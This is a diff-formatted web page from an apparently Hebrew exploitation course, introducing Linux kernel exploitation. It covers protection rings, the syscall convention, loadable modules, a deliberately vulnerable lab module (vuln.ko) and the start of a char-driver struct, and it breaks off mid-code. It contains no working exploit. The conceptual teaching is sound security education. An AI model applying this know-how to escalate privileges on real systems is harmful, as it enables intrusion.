+    <a href="../../../3%20-%20Shellcode/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3   Shellcode
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../4%20-%20%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20NX%20%D7%95ROP%20%D7%91%D7%A1%D7%99%D7%A1%D7%99/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4   עקיפת NX וROP בסיסי
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../5%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%9E%D7%97%D7%A8%D7%95%D7%96%D7%AA%20%D7%A4%D7%95%D7%A8%D7%9E%D7%98/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5   חולשות מחרוזת פורמט
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../6%20-%20ROP%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/6.1%20-%20stack%20pivoting/6.1%20-%20stack%20pivoting%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6   ROP מתקדם
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7   ניצול הHeap
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../8%20-%20%D7%94%D7%A0%D7%93%D7%A1%D7%94%20%D7%94%D7%A4%D7%95%D7%9B%D7%94%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8   הנדסה הפוכה לניצול
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_11" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_11" id="__nav_7_2_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9   ניצול קרנל ואתגרים מתקדמים
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_2_11_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    9   ניצול קרנל ואתגרים מתקדמים
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_11_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_11_1" id="__nav_7_2_11_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9.1   מבוא לניצול קרנל לינוקס
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_11_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_11_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    9.1   מבוא לניצול קרנל לינוקס
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9.1 - מבוא לניצול קרנל לינוקס - הרצאה
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9.1 - מבוא לניצול קרנל לינוקס - הרצאה
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-kernel-vs-userland" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הkernel מול מרחב המשתמש - kernel vs userland
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-the-syscall-boundary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        גבול הקריאה למערכת - the syscall boundary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-loadable-kernel-modules" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        זיכרון הkernel ומודולים נטענים - loadable kernel modules
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-char-driver" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מנהל התקן תווים - char driver
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-attack-surface" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        משטח התקיפה - attack surface
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-exploit-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מה משיג kernel exploit - הסלמת הרשאות
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-kernel-mitigations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מנגנוני הגנה בkernel - kernel mitigations
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-qemu-vulnerable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        סביבת המעבדה - QEMU ומודול vulnerable
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-arbitrary-readwrite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הפרימיטיבים שאנחנו רודפים אחריהם - arbitrary read/write
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        סיכום
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../9.2%20-%20syscall%20%D7%9E%D7%95%D7%AA%D7%90%D7%9D%20%D7%95ret2usr/9.2%20-%20syscall%20%D7%9E%D7%95%D7%AA%D7%90%D7%9D%20%D7%95ret2usr%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9.2   syscall מותאם וret2usr
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../9.3%20-%20%D7%98%D7%9B%D7%A0%D7%99%D7%A7%D7%95%D7%AA%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%95%D7%AA/9.3%20-%20%D7%98%D7%9B%D7%A0%D7%99%D7%A7%D7%95%D7%AA%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9.3   טכניקות קרנל מתקדמות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../9.4%20-%20%D7%9E%D7%A4%D7%AA%20%D7%92%D7%99%D7%A9%D7%94%20%D7%9C%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%94%D7%A7%D7%A9%D7%99%D7%9D/9.4%20-%20%D7%9E%D7%A4%D7%AA%20%D7%92%D7%99%D7%A9%D7%94%20%D7%9C%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%94%D7%A7%D7%A9%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9.4   מפת גישה לאתגרים הקשים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../10%20-%20%D7%9E%D7%A6%D7%99%D7%90%D7%AA%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%90%D7%9E%D7%99%D7%AA%D7%99%D7%95%D7%AA/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10   מציאת חולשות אמיתיות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-GPU/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות GPU
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-kernel-vs-userland" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הkernel מול מרחב המשתמש - kernel vs userland
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-the-syscall-boundary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        גבול הקריאה למערכת - the syscall boundary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-loadable-kernel-modules" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        זיכרון הkernel ומודולים נטענים - loadable kernel modules
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-char-driver" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מנהל התקן תווים - char driver
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-attack-surface" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        משטח התקיפה - attack surface
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-exploit-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מה משיג kernel exploit - הסלמת הרשאות
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-kernel-mitigations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מנגנוני הגנה בkernel - kernel mitigations
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-qemu-vulnerable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        סביבת המעבדה - QEMU ומודול vulnerable
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-arbitrary-readwrite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הפרימיטיבים שאנחנו רודפים אחריהם - arbitrary read/write
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        סיכום
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="ניווט" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    דף הבית
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר ו-Low Level
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר חולשות
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    9   ניצול קרנל ואתגרים מתקדמים
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    9.1   מבוא לניצול קרנל לינוקס
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>9.1 - מבוא לניצול קרנל לינוקס - הרצאה</h1>
+
+<p>עד עכשיו כל מה שתקפנו רץ במרחב המשתמש - תוכניות רגילות, עם המחסנית שלהן, ה-heap שלהן וה-libc שלהן. הרווח הכי גדול שהשגנו היה shell עם ההרשאות של אותה תוכנית. עכשיו אנחנו עולים קומה ומגיעים לשחקן הכי חזק במערכת: הkernel עצמו. הexploit של חולשה בkernel לא נותן לנו עוד shell רגיל - הוא נותן לנו את המכונה כולה. אנחנו הופכים ל-root, אנחנו קוראים וכותבים לכל בית בזיכרון, ואין מעלינו אף שכבת הגנה נוספת. זו הזירה שבה נלחמים על escape ממכונות וירטואליות, על root במכשירי אנדרואיד ועל jailbreak.</p>
+<p>הפרק הזה הוא הקדמה מושגית. לא נכתוב כאן exploit מלא מההתחלה ועד ה-root - את זה נעשה בשיעורים הבאים - אלא נבנה את התמונה: מה זה בכלל kernel מול userland, מאיפה מגיעות חולשות, מה בדיוק אנחנו מנסים להשיג, אילו הגנות עומדות בדרך, ואיך בונים סביבת מעבדה שבה אפשר לחקור את כל זה בבטחה. בסוף השיעור תהיה לכם מפה ברורה של השטח לפני שנצא לקרב.</p>
+<hr />
+<h2 id="kernel-kernel-vs-userland">הkernel מול מרחב המשתמש - kernel vs userland<a class="headerlink" href="#kernel-kernel-vs-userland" title="Permanent link">&para;</a></h2>
+<p>המעבד עצמו יודע להפריד בין שתי רמות הרצה, מה שנקרא protection rings. הקוד הרגיל שלנו רץ ב-ring 3, הרמה הכי פחות מיוחסת. הkernel רץ ב-ring 0, הרמה המלאה, שבה מותר להריץ הוראות פריבילגיות, לגשת לחומרה, ולשנות את טבלאות הדפים. כשאנחנו מדברים על "kernel exploit" הכוונה היא בדיוק לזה: לגרום לקוד שרץ ב-ring 0 לעשות משהו שלא התכוונו לו, ובכך לפרוץ את הגבול בין ring 3 ל-ring 0.</p>
+<p>ההבדל המהותי מהזירה הקודמת הוא הבידוד. במרחב המשתמש לכל תהליך יש מרחב כתובות משלו, והkernel שומר עלינו: תהליך אחד לא יכול לקרוא את הזיכרון של תהליך אחר. בkernel אין את הבידוד הזה בכלל. כל הkernel, כל הדרייברים וכל מבני הנתונים חיים במרחב כתובות אחד ויחיד. באג קטן בדרייבר של כרטיס קול יכול לדרוס את מבני ההרשאות של כל המערכת. אין "קריסה מקומית" - כשקורסים בkernel, קורסת המכונה כולה (kernel panic).</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ring 3 (userland)                 ring 0 (kernel)
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>+-------------------+             +----------------------+
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>| our process       |             | kernel code (.text)  |
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>| stack + heap      |   syscall   | drivers and modules  |
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>| libc              | ==========&gt; | task_struct, cred    |
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>| private addr space|   &lt;=======  | page tables          |
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>+-------------------+   return    +----------------------+
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>   isolation between processes    one space for the whole kernel, no isolation
+</code></pre></div>
+<p>בארכיטקטורת x86-64 מרחב הכתובות מחולק לשניים: החצי התחתון (כתובות שמתחילות ב-<code>0x0000...</code>) שייך למרחב המשתמש, והחצי העליון (כתובות קנוניות שמתחילות ב-<code>0xffff8...</code>) שייך לkernel. כשאתם רואים כתובת שמתחילה ב-<code>0xffffffff81...</code> אתם יודעים מיד: זו כתובת בתוך קוד הkernel.</p>
+<hr />
+<h2 id="-the-syscall-boundary">גבול הקריאה למערכת - the syscall boundary<a class="headerlink" href="#-the-syscall-boundary" title="Permanent link">&para;</a></h2>
+<p>איך תהליך רגיל בכלל מבקש מהkernel לעשות משהו? דרך system call. כשאתם קוראים <code>read</code>, <code>write</code> או <code>open</code>, ה-libc מתרגמת את זה בסופו של דבר להוראת המעבד <code>syscall</code>, שקופצת בצורה מבוקרת לתוך הkernel, מריצה את הפונקציה המתאימה ב-ring 0, ואז חוזרת אלינו.</p>
+<p>הקונבנציה של syscall בלינוקס 64 ביט חשובה, ונשתמש בה הרבה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>rax = call number (e.g. 0 = read, 1 = write, 59 = execve)
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>arguments:  rdi, rsi, rdx, r10, r8, r9
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>return value:   rax
+</code></pre></div>
+<p>שימו לב לפרט קטן וקריטי: הארגומנט הרביעי עובר ב-<code>r10</code> ולא ב-<code>rcx</code> כמו בקריאה רגילה לפונקציה. הסיבה היא שהוראת <code>syscall</code> עצמה דורסת את <code>rcx</code> (היא שומרת בו את הreturn address) ואת <code>r11</code> (שומרת בו את דגלי הסטטוס). זה הגבול: משני צדיו אותו מעבד, אבל צד אחד מהימן והשני לא. כל בית שעובר את הגבול הזה מ-userland פנימה הוא קלט לא מהימן שהkernel חייב לבדוק, וכל מקום שבו הkernel שוכח לבדוק אותו הוא חולשה פוטנציאלית.</p>
+<p>מהצד שלנו כתוקפים, גבול ה-syscall הוא נקודת הכניסה. אנחנו יושבים ב-ring 3, ואנחנו יכולים לזמן את הkernel שוב ושוב עם קלט שאנחנו שולטים בו במלואו. אם נמצא syscall אחד או handler אחד שמתייחס לקלט שלנו בלי זהירות, יש לנו יד בתוך ring 0.</p>
+<hr />
+<h2 id="kernel-loadable-kernel-modules">זיכרון הkernel ומודולים נטענים - loadable kernel modules<a class="headerlink" href="#kernel-loadable-kernel-modules" title="Permanent link">&para;</a></h2>
+<p>הkernel של לינוקס הוא מונוליטי, אבל מודולרי. הליבה נטענת בזמן האתחול, אבל אפשר לטעון ולפרוק קוד kernel נוסף בזמן ריצה בצורת מודולים - loadable kernel modules, או בקיצור LKM. אלה קבצי <code>.ko</code> (kernel object), ורוב הדרייברים במערכת הם מודולים כאלה.</p>
+<p>הפקודות הבסיסיות לניהול מודולים:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>lsmod<span class="w">                 </span><span class="c1"># which modules are currently loaded</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>modinfo<span class="w"> </span>vuln.ko<span class="w">       </span><span class="c1"># metadata about a module</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>sudo<span class="w"> </span>insmod<span class="w"> </span>vuln.ko<span class="w">   </span><span class="c1"># load a module into the kernel</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>sudo<span class="w"> </span>rmmod<span class="w"> </span>vuln<span class="w">       </span><span class="c1"># unload a module</span>
+</code></pre></div>
+<p>וזו הנקודה החשובה: ברגע שמודול נטען, הקוד שלו הופך לחלק בלתי נפרד מהkernel. הוא רץ ב-ring 0, במרחב הכתובות של הkernel, עם הרשאות מלאות. אין ארגז חול, אין בידוד. באג בדרייבר שכתב מישהו בחופזה שווה בדיוק לבאג בליבת הkernel. בגלל זה רוב מחקר החולשות בkernel מכוון דווקא לדרייברים ולמודולים - הם גדולים, רבים, נכתבו על ידי הרבה אנשים באיכות משתנה, והם מקבלים קלט ישירות מהמשתמש.</p>
+<hr />
+<h2 id="-char-driver">מנהל התקן תווים - char driver<a class="headerlink" href="#-char-driver" title="Permanent link">&para;</a></h2>
+<p>הדרך הכי נפוצה שבה מודול חושף את עצמו למרחב המשתמש היא דרך device file תחת <code>/dev</code>. מנהל התקן תווים - character device driver - רושם קובץ כזה, ומעכשיו כל תהליך יכול לפתוח אותו עם <code>open("/dev/vuln", ...)</code> ולתקשר איתו כאילו היה קובץ רגיל, דרך <code>read</code>, <code>write</code> ובעיקר <code>ioctl</code>.</p>
+<p>הקישור בין קריאות המשתמש לפונקציות בkernel נעשה דרך מבנה בשם <code>file_operations</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">file_operations</span><span class="w"> </span><span class="n">vuln_fops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="p">.</span><span class="n">owner</span><span class="w">          </span><span class="o">=</span><span class="w"> </span><span class="n">THIS_MODULE</span><span class="p">,</span>
